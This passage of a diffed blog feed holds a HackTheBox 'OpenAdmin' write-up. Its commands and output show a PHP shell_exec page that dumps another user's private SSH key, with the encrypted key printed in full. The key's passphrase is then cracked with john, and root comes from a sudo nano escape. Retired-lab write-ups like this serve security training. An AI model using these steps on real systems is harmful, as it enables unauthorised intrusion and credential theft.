+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;              &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jimmy&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha512&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                  &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jimmy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                  &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: /main.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;              &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                  &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Wrong username or password.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;              &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;/div&amp;gt; &amp;lt;!-- /container --&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;div class = &amp;quot;container&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;form class = &amp;quot;form-signin&amp;quot; role = &amp;quot;form&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;            action = &amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;htmlspecialchars&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHP_SELF&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;quot; method = &amp;quot;post&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;h4 class = &amp;quot;form-signin-heading&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;input type = &amp;quot;text&amp;quot; class = &amp;quot;form-control&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;username&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;              required autofocus&amp;gt;&amp;lt;/br&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;input type = &amp;quot;password&amp;quot; class = &amp;quot;form-control&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;password&amp;quot; required&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;button class = &amp;quot;btn btn-lg btn-primary btn-block&amp;quot; type = &amp;quot;submit&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;login&amp;quot;&amp;gt;Login&amp;lt;/button&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can see that the &lt;code&gt;main.php&lt;/code&gt; script just print &lt;code&gt;joanna&lt;/code&gt;'s private SSH key. And
+the script is only checking if the &lt;code&gt;username&lt;/code&gt; parameter is set. But we are
+unable to access the site. We check the Apache configuration to see that the
+port is &lt;code&gt;52846&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/apache2/sites-enabled/internal.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;Listen 127.0.0.1:52846&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;VirtualHost 127.0.0.1:52846&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    ServerName internal.openadmin.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;    DocumentRoot /var/www/internal&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;IfModule mpm_itk_module&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;AssignUserID joanna joanna&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/IfModule&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    ErrorLog ${APACHE_LOG_DIR}/error.log&lt;/span&gt;
+&lt;span class="code-line"&gt;    CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We rewrote &lt;code&gt;main.php&lt;/code&gt; in order to suppress the parameter check:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:/var/www/internal$ cat main.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class="code-line"&gt;$output = shell_exec(&amp;#39;cat /home/joanna/.ssh/id_rsa&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;;&lt;/span&gt;
+&lt;span class="code-line"&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And we call the page and get &lt;code&gt;joanna's&lt;/code&gt; private SSH key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;Proc-Type: 4,ENCRYPTED&lt;/span&gt;
+&lt;span class="code-line"&gt;DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8&lt;/span&gt;
+&lt;span class="code-line"&gt;ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO&lt;/span&gt;
+&lt;span class="code-line"&gt;ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE&lt;/span&gt;
+&lt;span class="code-line"&gt;6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ&lt;/span&gt;
+&lt;span class="code-line"&gt;ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du&lt;/span&gt;
+&lt;span class="code-line"&gt;y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI&lt;/span&gt;
+&lt;span class="code-line"&gt;9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4&lt;/span&gt;
+&lt;span class="code-line"&gt;piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/&lt;/span&gt;
+&lt;span class="code-line"&gt;/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH&lt;/span&gt;
+&lt;span class="code-line"&gt;40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ&lt;/span&gt;
+&lt;span class="code-line"&gt;fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb&lt;/span&gt;
+&lt;span class="code-line"&gt;9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80&lt;/span&gt;
+&lt;span class="code-line"&gt;X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg&lt;/span&gt;
+&lt;span class="code-line"&gt;S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F&lt;/span&gt;
+&lt;span class="code-line"&gt;FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh&lt;/span&gt;
+&lt;span class="code-line"&gt;Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa&lt;/span&gt;
+&lt;span class="code-line"&gt;RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z&lt;/span&gt;
+&lt;span class="code-line"&gt;uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr&lt;/span&gt;
+&lt;span class="code-line"&gt;1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2&lt;/span&gt;
+&lt;span class="code-line"&gt;XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79&lt;/span&gt;
+&lt;span class="code-line"&gt;yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM&lt;/span&gt;
+&lt;span class="code-line"&gt;+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt&lt;/span&gt;
+&lt;span class="code-line"&gt;qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt&lt;/span&gt;
+&lt;span class="code-line"&gt;z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe&lt;/span&gt;
+&lt;span class="code-line"&gt;K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We see that the key is password protected (second line of the key) so we use
+&lt;code&gt;ssh2john&lt;/code&gt; to convert the key to a crackable hash. Then we run john on it using
+the rockyou wordlist. We crack the &lt;code&gt;bloodninjas&lt;/code&gt; password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 /usr/bin/ssh2john id_rsa &amp;gt; id_rsa.hash&lt;/span&gt;
+&lt;span class="code-line"&gt;$ john id_rsa.hash -w=tools/password_lists/rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;SSH&amp;quot;, but the string is also recognized as &amp;quot;ssh-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=ssh-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 2 (iteration count) is 1 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Note: This format may emit false positives, so it will keep trying even after&lt;/span&gt;
+&lt;span class="code-line"&gt;finding a possible candidate.&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;bloodninjas      (id_rsa)&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: Only 1 candidate left, minimum 4 needed for performance.&lt;/span&gt;
+&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2020-01-07 15:25) 0.2087g/s 2994Kp/s 2994Kc/s 2994KC/s *7¡Vamos!&lt;/span&gt;
+&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We connect as &lt;code&gt;joanna&lt;/code&gt; using SSH.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh joanna@10.10.10.171 -i /tmp/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;/tmp/id_rsa&amp;#39;:&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;joanna@openadmin:~$ ls&lt;/span&gt;
+&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;joanna@openadmin:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;c9b2cf07d40807e62af62660f0c81b5f&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;p&gt;We start enumerating the box and found that we have the &lt;code&gt;sudo&lt;/code&gt; right without
+password on &lt;code&gt;/bin/nano /op/priv/&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;joanna@openadmin:~$ sudo -l&lt;/span&gt;
+&lt;span class="code-line"&gt;Matching Defaults entries for joanna on openadmin:&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User joanna may run the following commands on openadmin:&lt;/span&gt;
+&lt;span class="code-line"&gt;    (ALL) NOPASSWD: /bin/nano /opt/priv&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;A quick look at &lt;a href="https://gtfobins.github.io/gtfobins/nano/"&gt;GTFObins&lt;/a&gt; show us
+that we can execute commands in nano with &amp;lt;^R^X&amp;gt;. We just run &lt;code&gt;id&lt;/code&gt; and &lt;code&gt;cat
+/root/root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GNU nano 2.9.3&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;2f907ed450b361b2c2bf4e8795d5b561&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This was a really easy box with almost no rabbit hole. I will recommend this box
+for the beginner until it retires (of course this article will be publish after
+its retirement).&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="openAdmin"></category><category term="sudo"></category><category term="nano"></category></entry><entry><title>Hackpack CTF 2020</title><link href="https://maggick.fr/2020/04/hackpack-ctf-2020.html" rel="alternate"></link><published>2020-04-28T08:50:00+02:00</published><updated>2020-04-28T08:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-28:/2020/04/hackpack-ctf-2020.html</id><summary type="html">&lt;p&gt;&lt;img alt="Hackpack CTF logo" class="align-left" src="/media/2020.04/hackpack_logo.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This weekend I participate to the Hackpack CTF with the team &lt;code&gt;hackers for the jilted generation&lt;/code&gt;
 (mostly me this time). We finished 126th with 811 points.
 Here are some writeup about the challenges.&lt;/p&gt;
@@ -1133,420 +1546,7 @@ output what we need to do is to get a tiny tiny windows to trigger the pager.&lt
 &lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
 &lt;p&gt;This box is quit easy. The revershell is quit quick. The privilege escalation to
 user might a pain as there is some rabbit holes (like this &lt;code&gt;Nowonly4me&lt;/code&gt;
-password) and the root part is quit CTFish but quick.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="nostromo"></category><category term="journalctl"></category></entry><entry><title>HTB: OpenAdmin</title><link href="https://maggick.fr/2020/04/htb-openadmin.html" rel="alternate"></link><published>2020-04-05T14:09:00+02:00</published><updated>2020-04-05T14:09:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-05:/2020/04/htb-openadmin.html</id><summary type="html">&lt;p&gt;&lt;img alt="OpenAdmin card" class="align-left" src="/media/2020.05/openadmin_card.png" width="262"/&gt;&lt;/p&gt;
-&lt;p&gt;This is a writeup about a retired HacktheBox machine:
-&lt;a href="https://www.hackthebox.eu/home/machines/profile/222"&gt;OpenAdmin&lt;/a&gt; created by
-&lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt; and publish on
-January 4, 2020.
-This box is classified as an easy machine. The user part is longer than the root
-part and involve to find a vulnerable component, exploit it to get a shell,
-found the creds of an user able to connect using SSH then found another
-webservice to get the private SSH key of a second user.
-The root part is simply exploiting a sudo permission on &lt;code&gt;nano&lt;/code&gt; to execute command.&lt;/p&gt;
-</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.05/openadmin_card.png" alt="OpenAdmin card" width="262"&gt;&lt;/p&gt;
-&lt;p&gt;This is a writeup about a retired HacktheBox machine:
-&lt;a href="https://www.hackthebox.eu/home/machines/profile/222"&gt;OpenAdmin&lt;/a&gt; created by
-&lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt; and publish on
-January 4, 2020.
-This box is classified as an easy machine. The user part is longer than the root
-part and involve to find a vulnerable component, exploit it to get a shell,
-found the creds of an user able to connect using SSH then found another
-webservice to get the private SSH key of a second user.
-The root part is simply exploiting a sudo permission on &lt;code&gt;nano&lt;/code&gt; to execute command.&lt;/p&gt;
-
-
-&lt;h1 id="user"&gt;User&lt;/h1&gt;
-&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
-&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Jan  7 03:51:25 2020 as: nmap -sS -p- -oA 10.10.10.171 10.10.10.171&lt;/span&gt;
-&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.171&lt;/span&gt;
-&lt;span class="code-line"&gt;Host is up (0.27s latency).&lt;/span&gt;
-&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
-&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
-&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
-&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;# Nmap done at Tue Jan  7 04:23:21 2020 -- 1 IP address (1 host up) scanned in 1915.49 seconds&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h2 id="web"&gt;Web&lt;/h2&gt;
-&lt;p&gt;The landing page is the default Apache page.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="apache default page" src="/media/2020.05/openadmin_1.png"&gt;&lt;/p&gt;
-&lt;p&gt;We run a dirb against it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dirb http://10.10.10.171&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
-&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
-&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
-&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;START_TIME: Tue Jan  7 04:29:49 2020&lt;/span&gt;
-&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.171/&lt;/span&gt;
-&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.171/ ----&lt;/span&gt;
-&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.171/artwork/&lt;/span&gt;
-&lt;span class="code-line"&gt;+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)&lt;/span&gt;
-&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.171/music/&lt;/span&gt;
-&lt;span class="code-line"&gt;+ http://10.10.10.171/server-status (CODE:403|SIZE:277)&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The artwork directory is a rabbit hole (there is no dynamic code even for the
-contact page) but it was found first by dirb.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Artwork page" src="/media/2020.05/openadmin_2.png"&gt;&lt;/p&gt;
-&lt;p&gt;The music directory offer a login page which redirect us to the ona webpage.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Music page" src="/media/2020.05/openadmin_3.png"&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Music page" src="/media/2020.05/openadmin_4.png"&gt;&lt;/p&gt;
-&lt;h2 id="openadmin"&gt;OpenAdmin&lt;/h2&gt;
-&lt;p&gt;We can see on the ona (opennetadmin) that the version is the 18.1.1 which is not
-the latest. Using searchsploit we found a exploit for this specific version.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;searchsploit opennetadmin&lt;/span&gt;
-&lt;span class="code-line"&gt;------------------------ ----------------------------------------&lt;/span&gt;
-&lt;span class="code-line"&gt; Exploit Title          |  Path&lt;/span&gt;
-&lt;span class="code-line"&gt;                        | (/usr/share/exploitdb/)&lt;/span&gt;
